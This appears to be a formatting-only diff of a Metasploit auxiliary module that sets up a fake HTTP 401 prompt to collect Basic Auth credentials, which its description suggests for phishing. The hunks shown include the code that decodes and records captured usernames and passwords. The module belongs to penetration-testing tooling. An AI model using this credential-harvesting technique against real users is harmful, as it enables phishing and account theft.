@@ -7,38 +7,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'        => 'HTTP Client Basic Authentication Credential Collector',
-      'Description'    => %q{
-        This module responds to all requests for resources with a HTTP 401.  This should
-        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds
-        they are sent to the console.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'HTTP Client Basic Authentication Credential Collector',
+        'Description' => %q{
+          This module responds to all requests for resources with a HTTP 401.  This should
+          cause most browsers to prompt for a credential.  If the user enters Basic Auth creds
+          they are sent to the console.
 
-        This may be helpful in some phishing expeditions where it is possible to embed a
-        resource into a page.
+          This may be helpful in some phishing expeditions where it is possible to embed a
+          resource into a page.
 
-        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
-      },
-      'Author'      => ['saint patrick <saintpatrick[at]l1pht.com>'],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
+          This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.
+        },
+        'Author' => ['saint patrick <saintpatrick[at]l1pht.com>'],
+        'License' => MSF_LICENSE,
+        'Actions' => [
           [ 'Capture', 'Description' => 'Run capture web server' ]
         ],
-      'PassiveActions' =>
-        [
+        'PassiveActions' => [
           'Capture'
         ],
-      'DefaultAction'  => 'Capture'
-    ))
+        'DefaultAction' => 'Capture'
+      )
+    )
 
     register_options(
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
         OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
         OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
-      ])
+      ]
+    )
   end
 
   # Not compatible today
@@ -47,9 +49,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    @myhost   = datastore['SRVHOST']
-    @myport   = datastore['SRVPORT']
-    @realm    = datastore['REALM']
+    @myhost = datastore['SRVHOST']
+    @myport = datastore['SRVPORT']
+    @realm = datastore['REALM']
 
     exploit
   end
@@ -81,9 +83,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, req)
-    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
-      basic,auth = req['Authorization'].split(/\s+/)
-      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
+    if (req['Authorization'] and req['Authorization'] =~ /basic/i)
+      basic, auth = req['Authorization'].split(/\s+/)
+      user, pass = Rex::Text.decode_base64(auth).split(':', 2)
 
       report_cred(
         ip: cli.peerhost,
